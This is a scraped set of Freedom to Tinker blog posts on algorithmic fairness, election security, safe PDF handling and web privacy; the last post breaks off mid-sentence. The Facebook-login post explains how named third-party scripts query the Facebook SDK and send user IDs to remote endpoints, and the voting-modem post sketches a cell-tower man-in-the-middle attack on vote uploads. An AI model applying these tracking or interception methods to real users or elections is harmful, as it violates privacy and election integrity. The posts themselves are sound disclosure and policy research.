"123","2020-03-23","2023-03-24","https://freedom-to-tinker.com/2020/03/23/building-a-bridge-with-concrete-examples/","Thanks to Annette Zimmermann and Arvind Narayanan for their helpful feedback on this post. Algorithmic bias is currently generating a lot of lively public and scholarly debate, especially amongst computer scientists and philosophers. But do these two groups really speak the same language—and if not, how can they start to do so? I noticed at least two different ways of thinking about algorithmic bias during a recent research workshop on the ethics of algorithmic decision-making at Princeton University’s Center for Human Values, organized by political philosopher Dr. Annette Zimmermann. Philosophers are thinking about algorithmic bias in terms of things like the inherent value of explanation, the fairness and accountability rights afforded to humans, and whether groups that have been systematically affected by unfair systems should bear the burden for integration when transitioning to a uniform system. Computer scientists, by contrast, are thinking about algorithmic bias in terms of things like running a gradient backwards to visualize a heat map, projecting features into various subspaces devoid of protected attributes, and tuning hyperparameters to better satisfy a new loss function. Of course these are vast generalizations about the two fields, and there are plenty of researchers doing excellent work at the intersection, but it seems that for the most part while philosophers are debating which sets of ethical axioms ought to underpin algorithmic decision-making system, computer scientists are in the meantime already deploying these systems into the real world. In formulating loss functions, consequentialists might prioritize maximizing accurate outcomes for the largest possible number of people, even if that is at the cost of fair treatment, whereas deontologists might prioritize treating everyone fairly, even if that is at the cost of optimality. But there isn’t a definitive “most moral” answer, and if something like equalizing false positive rates were the key to fairness, we would not be having the alarming headlines of algorithmic bias that we have today. Inundated with various conflicting definitions of fairness, scientists are often optimizing for metrics they believe to be best and proceeding onwards. For example, one might reasonably think that the way to ensure fairness of an algorithm between different racial groups could be to enforce predictive parity (equal likelihood of accurate positive predictions), or to equalize false error rates, or just to treat similar individuals similarly. However, it is actually mathematically impossible to simultaneously satisfy seemingly reasonable fairness criteria like these in most real world settings. It is unclear how to choose amongst the criteria, and even more unclear how one would go about translating complex ideas that may require consideration, such as systematic oppression, into a world of optimizers and gradients. Since concrete mappings between a mathematical loss function and moral concepts are likely impossible to dictate, and philosophers are unlikely to settle on an ultimate theory of fairness, perhaps for now we can adopt a strategy that is, at least, not impossible to implement: a purposefully created, context- and application-specific validation/test set. The motivation behind this is that even if philosophers and ethicists cannot decisively articulate a set of general, static fairness desiderata, perhaps they can make more domain-specific, dynamic judgements: for instance whether one should prefer a system that gives person A with a set of attributes and features a loan or not. And they can also say that for person B and C and so on. Of course there will not be unanimous agreement, but at least a general consensus towards a particular outcome as preferable over the other. One could then create a whole set of such examples. Concepts like the idea that similar people should be treated similarly in a given decision scenario—the ‘like cases maxim’ in legal philosophy—could be encoded into this test set by having groups of people that differ only in a protected attribute be given the same result, and even concepts like equal accuracy rates across protected groups could be encoded in by having the test set be represented by equal numbers of people from each group rather than proportional to the real world majority/minority representations. However, the test set is not a constructually valid way to enforce these fairness constraints, and it shouldn’t be either, because the reason why such a test set would exist is that the right fairness criteria are not actually known, otherwise it would just be explicitly formulated into the loss function. At this juncture, ethicists and computer scientists could usefully engage in complementary work: ethicists could identify difficult edge cases that challenge what we think about moral questions and incorporate this into the test set, and computer scientists could work on optimizing accuracy rates on a given validation set. There are a few crucial differences, however, from similar collaborative approaches in other domains like when doctors are called on to provide expert labels on medical data so models can be trained to detect things like eye diseases. There is now the new notion that the distribution of the test set, in addition to just the labels, are going to be specifically decided upon by domain experts. Further, this collaboration would last beyond just the labeling of the data. Failure cases should be critically investigated earlier in the machine learning pipeline in an iterative and reflective way to ensure things like overfitting are not happening. Whether performing well on the hidden test set requires learning fairer representations in the feature space or thresholding different groups differently, scientists will build context-specific models that encompass certain moral values defined by ethicists, who are grounding the test set in examples of realizations of such values. But does this proposal mean adopting a potentially dangerous, ethically objectionable “the ends justify the means” logic? Not necessarily. With algorithm developers working in conjunction with ethicists to ensure the means are not unsavory, this could be a way to bridge the divide between abstract notions of fairness, and concrete ways of implementing systems. This may not be a long-term ideal way to deal with the problem of algorithmic fairness because of the difficulty in generalizing between applications, and in situations where creating an expert-curated test set is too expensive or not scalable, not preferred over satisfying one of the many mathematical definitions of fairness, but it could be one possible way to incorporate philosophical notions of fairness into the development of algorithms. Because technologists are not going to hold off and wait on deploying machine learning systems until they are in a state of fairness everyone agrees on, finding a way of incorporating philosophical views about central moral values like fairness and justice into algorithmic systems right now is an urgent problem. Supervised machine learning has traditionally been focused on predicting based on historical and existing data, but maybe we can structure our data in a way that is a model not of the society we actually live in, but of the one we hope to live in. Translating complex philosophical values into representative examples is not an easy task, but it is one that ethicists have been doing a version of for centuries in order to investigate moral concepts—and perhaps it can also be the way to convey some sense of our morals to machines."
"124","2020-04-28","2023-03-24","https://freedom-to-tinker.com/2020/04/28/fair-elections-during-a-crisis/","Even before the crisis of COVID-19, which will have severe implications for the conduct of the 2020 elections, the United States faced another elections crisis of legitimacy: Americans can no longer take for granted that election losers will concede a closely fought election after election authorities (or courts) have declared a winner. Along with two dozen other scholars (in Tech, Law, Political Science, and Media), I joined an ad-hoc working group convened by Professor Rick Hasen of the U.C. Irvine Law School, to make recommendations on steps that American election administrators (and others) can take this year to deal with these two overlapping crises. Our report has just been released: Fair Elections During a Crisis: Urgent Recommendations in Law, Media, Politics, and Tech to Advance the Legitimacy of, and the Public Confidence in, the November 2020 U.S. Elections. We make 14 specific recommendations. In Law: regarding absentee ballots, emergency plans, COVID-19, vote-counting dispute-resolution protocols. Media: how media can provide accurate information to voters about the election process, expectations for timing of election results (slower this year than before). Politics and Norms: Funding for COVID-19 costs, bipartisan Election Crisis Commission, principles for fair elections, responsibilities of social media. Tech: paper ballots and audits, resilient election infrastructure, .gov domains for election officials, monitoring and auditing of voter-registration databases."
"125","2020-05-20","2023-03-24","https://freedom-to-tinker.com/2020/05/20/emergency-motion-to-stop-internet-voting-in-nj/","with Penny Venetis On May 4th, 2020 a press release from mobilevoting.org announced that New Jersey would allow online voting in a dozen school-board elections scheduled for May 12th. On May 11, the Rutgers International Human Rights Clinic filed an emergency motion to stop internet voting in New Jersey. During a conference on May 18 with Superior Court Judge Mary Jacobson, the State notified the court that it had abandoned its plans to use internet voting for the upcoming July 7 primary election. The Clinic, led by Rutgers Law School professor Penny Venetis, argued that the Democracy Live online voting system (that New Jersey planned to use) violated a broad court order issued in March 2010 by Judge Linda Feinberg. That order was issued in the Clinic’s case Gusciora v. Corzine, which challenged paperless voting machines as unconstitutional. The March 2010 court order stated clearly and unequivocally that no part of any New Jersey voting system could be connected to the internet, under any circumstance. New Jersey has a continuing obligation to ensure that the order is followed, and that all voting-related software is “hardened” on a regular basis. Democracy Live’s voting portal permits voters to transmit their cast ballot, via the internet, to county election officials, for tabulation. Despite the state’s assertions to the contrary, it is an internet-based system that violates the 2010 order in Gusciora. Princeton Professor Andrew Appel filed a certification (for the emergency motion) discussing the overwhelming scientific consensus that internet based voting is insecure. The IHR Clinic also provided the court with scientific reports, a US Department of Homeland Security report, and a letter from the US House of Representatives Homeland Security Committee. Those documents all discussed the insecurity of the Democracy Live system (or any system with online ballot return). Susan Greenhalgh of Free Speech for People, participated in negotiations with the State. The Washington Post covered the lawsuit favorably on May 14th. Common Cause, the Brennan Center, and Verified Voting wrote New Jersey Governor Phil Murphy on May 15th, in support of the IHR Clinic’s position. In the hearing on May 18th with Judge Jacobson, the State agreed not to use online voting in the July 7th primary elections, but did not commit to abandoning Democracy Live’s online portal for the November 2020 Presidential election. Judge Jacobson ordered the IHR Clinic and the NJ Attorney General’s office to file a joint document by June 8, 2020 that lays out the resolution of the May 11th court filing. As a result, the court will keep the IHR Clinic’s matter open, in the event it needs to issue a ruling to enforce the 2010 order that bans internet use for voting in New Jersey."
"126","2020-06-24","2023-03-24","https://freedom-to-tinker.com/2020/06/24/safely-opening-pdfs-received-by-e-mail-or-fax/","Many election administrators in U.S. states and counties need to receive and open PDF files from voters. Some of these administrators receive these PDFs as e-mail attachments. These may be filled-out voter registration forms, or even voted ballots from UOCAVA (overseas and military) voters. We all know that malware can lurk in e-mail attachments; how can those election officials protect themselves from being hacked? Internet return of voted ballots is inherently insecure; that’s a separate issue and I’ll discuss it below. For now, how can one safely open a PDF attachment? I discussed this question with Dan Guido, cybersecurity consultant and CEO of trailofbits.com. The safe way to view a PDF is inside the Chrome or Firefox browser. Printing a PDF directly from Chrome (or Firefox) to your printer is reasonably safe. The unsafe way to view a PDF is with your favorite PDF-viewer app such as Adobe Reader. The reason is simple: Google (for Chrome) and Mozilla (for Firefox) have put enormous effort into making their PDF viewers safe, putting them inside a “sandbox” that the hackers can’t get out of — and they’ve largely succeeded. The PDF file format has hundreds of obscure features and complex functionality that are not needed for simple documents. Chrome and Firefox don’t bother to understand the obscure features: they concentrate on getting the common features displayed safely. On the other hand, Adobe Reader does handle all the features of PDF; that’s a much larger thing to get perfectly right, and (perhaps) security is not Adobe’s highest priority. Sometimes that means that Chrome or Firefox don’t render your document properly; but this is unlikely to be a problem for simple documents such as voter-registration forms or optical-scan ballots. In some ways that’s a bit disappointing. I like Adobe Reader’s navigation and document-viewing facilities much more than I like the browser’s built-in PDF display. But I should be careful to use Adobe tools only for documents whose provenance I know, or that have been otherwise vetted. If you do save your PDF to a file, and are tempted to open it later: again, you can use Chrome or Firefox to open it. (See also: PDF.js) If you want to open it in a full-featured (but less secure) tool, first use a PDF “triage tool” such as PDFid, which will scan the file and tell you if anything looks suspicious. Is it safe to use Fax? Many jurisdictions still permit (or require) forms and ballots to be sent to them by Fax. Is that safe? Once upon a time, a “fax machine” was connected to a “land line” that went through the “phone network.” How safe that was in 1985 is no longer relevant today, when nobody has a “fax machine” and the “phone network” is the Internet. Most voters, and many election administrators, use on-line fax services such as HelloFax. The voter logs in and upload a PDF file; the fax service converts it to a fax-format bitstream and sends it into the part of the Internet called “the phone system”; the receiver logs in (perhaps to a different on-line fax service) and downloads a PDF file that has been converted from the bitstream. This has so many points of insecurity: the sender’s online-fax service company may be more or less vulnerable to hackers (or insiders); the receiver’s online-fax service, ditto; and the fax-format bitstream is transmitted unencrypted, unauthenticated across the phone network. In contrast, e-mail can be a lot more secure than that. If you use a major e-mail provider (such as gmail, Microsoft, fastmail) that knows what it’s doing; and if the recipient also uses a reputable e-mail provider, then: your e-mail is uploaded encrypted (and authenticated) to an SMTP server, which goes encrypted (and authenticated) to another SMTP server, which is downloaded encrypted (and authenticated) to the recipient’s mail reader. The vast majority of Internet e-mail traffic is protected this way. So e-mail your stuff, don’t fax it. Is e-mail secure? Can we vote that way? If e-mail is so much more secure than it was 30 years ago, can we safely vote by e-mail? Unfortunately, no. Even if Internet messages (by e-mail or other protocols) are safe in transmission, the biggest security lapses are in the server computers and especially in the client’s (voter’s) computers. Hackers who can penetrate the security of those systems can change votes before they’re sent, or after they’re received (but before they’re counted). Furthermore, e-mail is sent from the voter’s computer to the SMTP server (at Google, or Microsoft, or fastmail…) where it is unencrypted and reencrypted for sending to the receiver’s SMTP server (at Microsoft, or fastmail, or Google, …). It’s like, you mail your absentee ballot to your landlord, who takes it out of its envelope, puts it in a fresh envelope, and mails it to an election official. Even if we trust our landlord (and I expect Google, Microsoft, and fastmail are doing a good job), should we need to trust this intermediary? The citizenry elect their government; we don’t entrust this process to a few big tech companies. And finally, 6% of email (that’s either outbound or inbound from gmail.com) is still unencrypted–that is, insecure. Six percent may not seem like a lot, but it’s millions of users. Is e-mail voter-registration secure enough? Internet return of voted ballots, which is not securable by any known technology. But voter-registration can reasonably be done by e-mail: the voter sends in a form, perhaps a scan-to-PDF of their printed and signed registration form. The reason this can work, when it can’t work for voted ballots, is the ability to audit the individual transaction: after a few days, the voter can check the status of their registration with the election official, or the election official can contact the voter to check up. So even if there’s hacking in the client or server computer, it can be detected and corrected. With ballots, we have the secret ballot: nobody is supposed to learn how you voted. Without the ability to check and correct later, “did my ballot get counted for the person I voted for?”, internet voting is insecurable."
"127","2018-02-22","2023-03-24","https://freedom-to-tinker.com/2018/02/22/are-voting-machine-modems-truly-divorced-from-the-internet/","(This article is written jointly with my colleague Kyle Jamieson, who specializes in wireless networks.) [See also: The myth of the hacker-proof voting machine] The ES&S model DS200 optical-scan voting machine has a cell-phone modem that it uses to upload election-night results from the voting machine to the “county central” canvassing computer. We know it’s a bad idea to connect voting machines (and canvassing computers) to the Internet, because this allows their vulnerabilities to be exploited by hackers anywhere in the world. (In fact, a judge in New Jersey ruled in 2009 that the state must not connect its voting machines and canvassing computers to the internet, for that very reason.) So the question is, does DS200’s cell-phone modem, in effect, connect the voting machine to the Internet? The vendor (ES&S) and the counties that bought the machine say, “no, it’s an analog modem.” That’s not true; it appears to be a Multitech MTSMC-C2-N3-R.1 (Verizon C2 series modem), a fairly complex digital device. But maybe what they mean is “it’s just a phone call, not really the Internet.” So let’s review how phone calls work: The voting machine calls the county-central computer using its cell-phone modem to the nearest tower; this connects through Verizon’s “Autonomous System” (AS), part of the packet-switched Internet, to a cell tower (or land-line station) near the canvassing computer. Verizon attempts to control access to the routers internal to its own AS, using firewall rules on the border routers. Each border router runs (probably) millions of lines of software; as such it is subject to bugs and vulnerabilities. If a hacker finds one of these vulnerabilities, he can modify messages as they transit the AS network: Do border routers actually have vulnerabilities in practice? Of course they do! US-CERT has highlighted this as an issue of importance. It would surprising if the Russian mafia or the FBI were not equipped to exploit such vulnerabilities. Even easier than hacking through router bugs is just setting up an imposter cell-phone “tower” near the voting machine; one commonly used brand of these, used by many police departments, is called “Stingray.” I’ve labelled the hacker as “MitM” for “man-in-the-middle.” He is well positioned to alter vote totals as they are uploaded. Of course, he will do better to put his Stingray near the county-central canvassing computer, so he can hack all the voting machines in the county, not just one near his Stingray: So, in summary: phone calls are not unconnected to the Internet; the hacking of phone calls is easy (police departments with Stingray devices do it all the time); and even between the cell-towers (or land-line stations), your calls go over parts of the Internet. If your state laws, or a court with jurisdiction, say not to connect your voting machines to the Internet, then you probably shouldn’t use telephone modems either."
"128","2016-09-29","2023-03-24","https://freedom-to-tinker.com/2016/09/29/my-testimony-before-the-house-subcommittee-on-it/","I was invited to testify yesterday before the U.S. House of Representatives Subcommittee on Information Technology, at a hearing entitled “Cybersecurity: Ensuring the Integrity of the Ballot Box.” My written testimony is available here. My 5-minute opening statement went as follows: My name is Andrew Appel. I am Professor of Computer Science at Princeton University. In this testimony I do not represent my employer. I’m here to give my own professional opinions as a scientist, but also as an American citizen who cares deeply about protecting our democracy. My research is in software verification, computer security, technology policy, and election machinery. As I will explain, I strongly recommend that, at a minimum, the Congress seek to ensure the elimination of Direct-Recording Electronic voting machines (sometimes called “touchscreen” machines), immediately after this November’s election; and that it require that all elections be subject to sensible auditing after every election to ensure that systems are functioning properly and to prove to the American people that their votes are counted as cast. There are cybersecurity issues in all parts of our election system: before the election, voter-registration databases; during the election, voting machines; after the election, vote-tabulation / canvassing / precinct-aggregation computers. In my opening statement I’ll focus on voting machines. The other topics are addressed in a recent report I have co-authored entitled “Ten Things Election Officials Can Do to Help Secure and Inspire Confidence in This Fall’s Elections.” In the U.S. we use two kinds of voting machines: optical scanners that count paper ballots, and “touchscreen” voting machines, also called “Direct-Recording Electronic.” Each voting machine is a computer, running a computer program. Whether that computer counts the votes accurately, or makes mistakes, or cheats by shifting votes from one candidate to another, depends on what software is installed in the computer. We all use computers, and we’ve all had occasion to install new software. Sometimes it’s an app we purchase and install on purpose, sometimes it’s a software upgrade sent by the company that made our operating system. Installing new software in a voting machine is not really much different from installing new software in any other kind of computer. Installing new software is how you hack a voting machine to cheat. In 2009, in the courtroom of the Superior Court of New Jersey, I demonstrated how to hack a voting machine. I wrote a vote-stealing computer program that shifts votes from one candidate to another. Installing that vote-stealing program in a voting machine takes 7 minutes, per machine, with a screwdriver. I did this in a secure facility and I’m confident my program has not leaked out to affect real elections, but really the software I built was not rocket science — any computer programmer could write the same code. Once it’s installed, it could steal elections without detection for years to come. Voting machines are often delivered to polling places several days before the election—to elementary schools, churches, firehouses. In these locations anyone could gain access to a voting machine for 10 minutes. Between elections the machines are routinely opened up for maintenance by county employees or private contractors. Let’s assume they have the utmost integrity, but still, in the U.S. we try to run our elections so that we can trust the election results without relying on any one individual. Other computer scientists have demonstrated similar hacks on many models of machine. This is not just one glitch in one manufacturer’s machine, it’s the very nature of computers. So how can we trust our elections when it’s so easy to make the computers cheat? Forty states already know the answer: vote on optical-scan paper ballots. (My written testimony clarifies this statement.) The voter fills in the bubble next to the name of their preferred candidate, then takes this paper ballot to the scanner—right there in the precinct—and feeds it in. That opscan voting machine has a computer in it, and we can’t 100% prevent the computer from being hacked, but that very paper ballot marked by the voter drops into a sealed ballot box under the opscan machine. Those ballots can be recounted by hand, in a way we can trust. Unfortunately, there are still about 10 states that primarily use paperless touchscreen voting computers. There’s no paper ballot to recount. After the voter touches the screen, we have to rely on the computer—that is, we have to rely on whatever program is installed in the computer that day—to print out the true totals when the polls close. So what must we do? In the near term, we must not connect the voting machines to the Internet. The same goes for those computers used to prepare the electronic ballot definition files before each election, that are used to program the voting machines—that is, we must not connect the voting machines even indirectly to the Internet. Many able and competent election administrators already follow this “best practice.” I hope that all 9000 counties and states that run elections follow this practice, and other security best practices, but it’s hard to tell whether they all do. These and other best practices can help protect against hacking of voting machines by people in other countries through the Internet. But they can’t protect us from mistakes, software bugs, miscalibration, insider hacking, or against local criminals with access to the machines before or after elections. So what we must do as soon as possible after November is to adopt nationwide what 40 states have already done: paper ballots, marked by the voter, countable by computer but recountable by hand. In 2000 we all saw what a disastrously unreliable technology those punch-card ballots were. So in 2002 the Congress outlawed punch-card ballots, and that was very appropriate. I strongly recommend that the Congress seek to ensure the elimination of paperless “touchscreen” voting machines, immediately after this November’s election."
"129","2018-04-18","2023-03-24","https://freedom-to-tinker.com/2018/04/18/no-boundaries-for-facebook-data-third-party-trackers-abuse-facebook-login/","by Steven Englehardt [0], Gunes Acar, and Arvind Narayanan So far in the No boundaries series, we’ve uncovered how web trackers exfiltrate identifying information from web pages, browser password managers, and form inputs. Today we report yet another type of surreptitious data collection by third-party scripts that we discovered: the exfiltration of personal identifiers from websites through “login with Facebook” and other such social login APIs. Specifically, we found two types of vulnerabilities [1]: seven third parties abuse websites’ access to Facebook user data one third party uses its own Facebook “application” to track users around the web. Vulnerability 1: Third parties piggyback on Facebook access granted to websites When a user clicks “Login with Facebook”, they will be prompted to allow the website they’re visiting to access some of their Facebook profile information [2]. Even after Facebook’s recent moves to lock down the feature, websites can request the user’s email address and “public profile” (name, age range, gender, locale, and profile photo) without triggering a manual review by Facebook. Once the user allows access, any third-party Javascript embedded in the page, such as tracker.com in the figure above, can also retrieve the user’s Facebook information as if they were the first party [3]. Facebook Login and other social login systems simplify the account creation process for users by decreasing the number of passwords to remember. But social login brings risks: Cambridge Analytica was found misusing user data collected by a Facebook quiz app which used the Login with Facebook feature. We’ve uncovered an additional risk: when a user grants a website access to their social media profile, they are not only trusting that website, but also third parties embedded on that site. We found seven scripts collecting Facebook user data using the first party’s Facebook access [4]. These scripts are embedded on a total of 434 of the top 1 million sites (UPDATE: see clarification below). We detail how we discovered these scripts in Appendix 1 below. Most of them grab the user ID, and two grab additional profile information such as email and username. We are unable to determine whether first parties are aware of this particular data access [5]. The user ID collected through the Facebook API is specific to the website (or the “application” in Facebook’s terminology), which would limit the potential for cross-site tracking. But these app-scoped user IDs can be used to retrieve the global Facebook ID, user’s profile photo, and other public profile information, which can be used to identify and track users across websites and devices [6]. Company Script Address Facebook Data Collected OnAudience* http://api.behavioralengine.com/scripts/be-init.js User ID (hashed), Email (hashed), Gender Augur https://cdn.augur.io/augur.min.js Email, Username Lytics** https://d3c…psk.cloudfront.net/opentag-54778-547608.js?_=[*] User ID ntvk1.ru https://p1.ntvk1.ru/nv.js User ID ProPS^ http://st-a.props.id/ai.js User ID (has code to collect more) Tealium^ http://tags.tiqcdn.com/utag/ipc/[*]/prod/utag.js User ID Forter^ https://cdn4.forter.com/script.js?sn=[*] User ID * OnAudience stopped collecting this information after we released the results of a previous study in the No Boundaries series, which showed them abusing browser autofill to collect user email addresses. **(Added 2018-04-22; 5:55pm): The script loaded by Opentag tag manager includes a code snippet which accesses the Facebook API and sends the user ID to an endpoint of the form https://c.lytics.io/c/1299?fbstatus=[...]&fbuid=[...]&[...] This snippet appears to be a modified version of an example code snippet found on the lytics.github.io website with the description “Capturing Facebook Events”. The example code appears to provide instructions for first parties to collect Facebook user ID and login status. ^ Although we observe these scripts query the Facebook API and save the user’s Facebook ID, we could not verify that it is sent to their server due to obfuscation of their code and some limitations of our measurement methods. It is straightforward for a third party script to grab data from the Facebook API. The code snippet above is from the OpenTag script that exfiltrates the user’s Facebook ID to Lytics, a personalized Marketing and Customer Data Platform. We’ve added comments and made minor simplifications for clarity; the original script is available here. The script continually checks for the existence of the Facebook API (available via window.FB). Once the user logs in to Facebook, the tracking script can silently query the user’s login status. The response to the login status query contains the user’s Facebook ID. The script then parses the ID out of the response and sends it back to a remote server. While we can’t say how these trackers use the information they collect, we can examine their marketing material to understand how it may be used. OnAudience, Tealium AudienceStream, Lytics, and ProPS all offer some form of “customer data platform”, which collect data to help publishers to better monetize their users. Forter offers “identity-based fraud prevention” for e-commerce sites. Augur offers cross-device tracking and consumer recognition services. We were unable to determine the company which owns the ntvk1.ru domain. Vulnerability 2: Tracking users around the web with the Facebook Login service Some third parties use the Facebook Login feature to authenticate users across many websites: Disqus, a commenting widget, is a popular example. However, hidden third-party trackers can also use Facebook Login to deanonymize users for targeted advertising. This is a privacy violation, as it is unexpected and users are unaware of it. But how can a hidden tracker get the user to Login with Facebook? When the same tracker is also a first party that users visit directly. This is exactly what we found Bandsintown doing. Worse, they did so in a way that allowed any malicious site to embed Bandsintown’s iframe to identify its users. Top panel: Bandsintown’s website (represented as tracker.com) allows visitors to learn about local concerts and follow artists they might be interested in. To follow an artist, users are required to Login with Facebook and give the Bandsintown Facebook app access to their profile, city, likes, email address, and music activity. At this point Bandsintown has access to the necessary authentication tokens to access Facebook account information. Bottom panel: Bandsintown offers an advertising service called “Amplified”, which is present on many of the top music-related sites including lyrics.com, songlyrics.com and lyricsmania.com. When a Bandsintown user browses to a website that embeds Bandsintown’s Amplified advertising product, the advertising script embeds an invisible iframe which connects to Bandsintown’s Facebook application using the authentication tokens established earlier, and grabs the user’s Facebook ID. The iframe then passes the user ID back to the embedding script. We discovered that the iframe injected by Bandsintown would pass the user’s information to the embedding script indiscriminately. Thus, any malicious site could have used their iframe to identify visitors. We informed Bandsintown of this vulnerability and they confirmed that it is now fixed. Conclusion This unintended exposure of Facebook data to third parties is not due to a bug in Facebook’s Login feature. Rather, it is due to the lack of security boundaries between the first-party and third-party scripts in today’s web. Still, there are steps Facebook and other social login providers can take to prevent abuse: API use can be audited to review how, where, and which parties are accessing social login data. Facebook could also disallow the lookup of profile picture and global Facebook IDs by app-scoped user IDs. It might also be the right time to make Anonymous Login with Facebook available following its announcement four years ago. Clarification (2018-04-19 2:25am): In a previous version of the post we listed three sites (fiverr.com, bhphotovideo.com, and mongodb.com) which embed scripts that match the URL patterns given above. Third-party scripts may contain different contents when loaded by different sites, even though the scripts are served from same or similar URLs. We confirmed that the Forter scripts embedded on fiverr.com and bhphotovideo.com do NOT include functionality to access Facebook data. On mongodb.com we only observed the presence of an Augur script. We have published an updated list of sites, marking the ones where we have confirmed the presence of functionality to access Facebook data. Correction (2018-04-22; 05:55pm): In a previous version of this post, we listed a Lytics script (https://c.lytics.io/static/io.min.js) as the cause of Facebook API access. Although this script is used to send the Facebook user ID to Lytics (c.lytics.io), the code which accesses the Facebook API was served within an OpenTag script as described above. The code snippet in the OpenTag script responsible for accessing Facebook user data is likely configured by the first party, so we have removed our previous opinion that first parties are likely unaware of the data access. Several companies stated that they do not use Facebook data for third-party tracking purposes. [0] Steven Englehardt is currently working at Mozilla as a Privacy Engineer. He coauthored this post in his Princeton capacity, and this post doesn’t necessarily represent Mozilla’s views. [1] We use the term “vulnerability” to refer to weaknesses arising from insecure design practices on today’s web, rather than its commonly understood sense in computer security of weaknesses arising due to software bugs. [2] In this post we focus on websites which use Facebook Login, but the vulnerabilities we describe are likely to exist for most social login providers and on mobile devices. Indeed, we found scripts that appear to grab user identifiers from the Google Plus API and from the Russian social media site VK , but we limited our investigation to Facebook Login as it’s the most widely used social SDK on the web. [3] When the user completes the Facebook login procedure on a website that uses Facebook’s Javascript SDK, the SDK stores an authentication token in the page. When the user navigates to a new page, the SDK automatically reestablishes the authentication token using the browser’s Facebook cookies. All third-party queries to the SDK automatically use this token. [4] In order to better understand the level of integration a third party has with the first party, we categorize scripts based on their use of the first party’s Application ID (or AppId), which is provided to Facebook during the login initialization phase to identify the site. Inclusion of a site’s application ID and initialization code in the third-party library suggests a tighter integration—the first party was likely required to configure the third-party script to access the Facebook SDK on their behalf. While application IDs aren’t meant to be secrets, we take the lack of an App ID to imply loose integration—the first party may not be aware of the access. In fact, all of the scripts in this category take the same actions when embedded on a simple test page with no prior business relationship. [5]. The following could indicate the first party’s awareness of the Facebook data access: 1) third-party initiates the Facebook login process instead of passively waiting for the login to happen; 2) third-party includes the unique App ID of the website it is embedded on. The seven scripts listed above neither initiate the login process, nor contain the app ID of the websites. Still, it is very hard to be certain about the exact relationship between the first parties and third parties. [6] The application-scoped IDs can be resolved to real user profile information by querying Facebook’s Graph API or retrieve the user’s profile photo (which does not even require authentication!). When security researchers showed that it is possible to map app-scoped IDs to Facebook IDs and download profile pictures Facebook responded as follows: “This is intentional behavior in our product. We do not consider it a security vulnerability, but we do have controls in place to monitor and mitigate abuse.” A Facebook interface with similar controls was reportedly used to harvest of 2 Billion Facebook users’ public profile data. Note that although the endpoint found by the researchers does not work anymore, the following endpoint still redirects to users’ profile page: https://www.facebook.com/[app_scoped_ID]. APPENDIX: Appendix 1 — Measurement Methods To study the abuse of social login APIs we extended OpenWPM to simulate that the user has authenticated and given full permissions to the Facebook Login SDK on all sites. We added instrumentation to monitor the use of the Facebook SDK interface (`window.FB`). We did not otherwise inject the user’s identity into the page, so any exfiltrated personal data must have been queried from our spoofed API. As in our previous measurements, we crawled 50,000 sites from the Alexa top 1 million in June 2017. We used the following sampling strategy: visit all of the top 15,000 sites, randomly sample 15,000 sites from the Alexa rank range [15,000 100,000), and randomly sample 20,000 sites from the range [100,000, 1,000,000). This combination allowed us to observe the attacks on both high and low traffic sites. On each of these 50,000 sites we visited 6 pages: the front page and a set of 5 other pages randomly sampled from the internal links on the front page. To spoof that a user is logged in, we create our own `window.FB` object and replicate the interface of version 2.8 of the Facebook SDK. The spoofed API has the following properties: For method calls that normally return personal information we spoof the return values as if the user is logged in and call and necessary callback function arguments. These include `FB.api()`, `FB.init(), `FB.getLoginStatus()`, `FB.Event.subscribe()` for the events `auth.login`, `auth.authResponseChange`, and `auth.statusChange`, and `FB.getAuthResponse()`. For the Graph API (`FB.api`), we support most of the profile data fields supported by the real Facebook SDK. We parse the requested fields and return a data object in the same format the real graph API would return. For method calls that don’t return personal information we simply call a no-op function and ignore any callback arguments. This helps minimize breakage if a site calls a method we don’t fully replicate. We fire `window.fbAsyncInit` once the document has finished loading. This function is normally called by the Facebook SDK. The spoofed `window.FB` object is injected into every frame on every page load, regardless of the presence of a real Facebook SDK. We then monitor access to the API using OpenWPM’s Javascript call monitoring. All HTTP request and response data, include HTTP POST payloads are examined to detect the exfiltration of any of the spoofed profile data (including that which has been hashed or encoded). For both calls to `window.FB` and HTTP data, we store the Javascript stack trace at the time of execution. We use this stack trace to understand which APIs scripts accessed and when they were sending data back. For some scripts our instrumentation only captured the API access, but not the exfiltration. In these cases, we manually debugged the scripts to determine whether the data was only used locally or if it was obfuscated before being transmitted. We explicitly note the cases where we could not make this determination. Appendix 2 — Third parties which access the Facebook API on behalf of first parties We also found a number of third-party scripts interacting with the Facebook API, which appear to be operating on behalf of the first party [4]. These companies offer a range of services, such as integrating multiple social login options, monitoring social media engagement, and aggregating customer data. As a specific example, BlueConic offers a Facebook Profile transfer service, that copies information from the user’s Facebook profile information to BlueConic’s data platform. Additional third-party services which access Facebook profile information on the first party’s behalf include: Zummy, Social Miner, Limespot (personalizer.io), Kissmetrics, Gigya, and Webtrends. (Update: Limespot informed us that they deactivated the relevant feature in November 2017.) BlueConic’s Facebook Profile Transfer service will populate a publisher’s dashboard with information from the user’s Facebook profile. Image assets used in figures are from the Noun Project: computer tower by Melvin, Female by SBTS, javascript file by Adnen Kadri, click by Aybige"
"130","2017-11-15","2023-03-24","https://freedom-to-tinker.com/2017/11/15/no-boundaries-exfiltration-of-personal-data-by-session-replay-scripts/","This is the first post in our “No Boundaries” series, in which we reveal how third-party scripts on websites have been extracting personal information in increasingly intrusive ways. [0] by Steven Englehardt, Gunes Acar, and Arvind Narayanan Update: we’ve released our data — the list of sites with session-replay scripts, and the sites where we’ve confirmed recording by third parties. You may know that most websites have third-party analytics scripts that record which pages you visit and the searches you make. But lately, more and more sites use “session replay” scripts. These scripts record your keystrokes, mouse movements, and scrolling behavior, along with the entire contents of the pages you visit, and send them to third-party servers. Unlike typical analytics services that provide aggregate statistics, these scripts are intended for the recording and playback of individual browsing sessions, as if someone is looking over your shoulder. The stated purpose of this data collection includes gathering insights into how users interact with websites and discovering broken or confusing pages. However the extent of data collected by these services far exceeds user expectations [1]; text typed into forms is collected before the user submits the form, and precise mouse movements are saved, all without any visual indication to the user. This data can’t reasonably be expected to be kept anonymous. In fact, some companies allow publishers to explicitly link recordings to a user’s real identity. For this study we analyzed seven of the top session replay companies (based on their relative popularity in our measurements [2]). The services studied are Yandex, FullStory, Hotjar, UserReplay, Smartlook, Clicktale, and SessionCam. We found these services in use on 482 of the Alexa top 50,000 sites. This video shows the “co-browse” feature of one company, where the publisher can watch user sessions live. What can go wrong? In short, a lot. Collection of page content by third-party replay scripts may cause sensitive information such as medical conditions, credit card details and other personal information displayed on a page to leak to the third-party as part of the recording. This may expose users to identity theft, online scams, and other unwanted behavior. The same is true for the collection of user inputs during checkout and registration processes. The replay services offer a combination of manual and automatic redaction tools that allow publishers 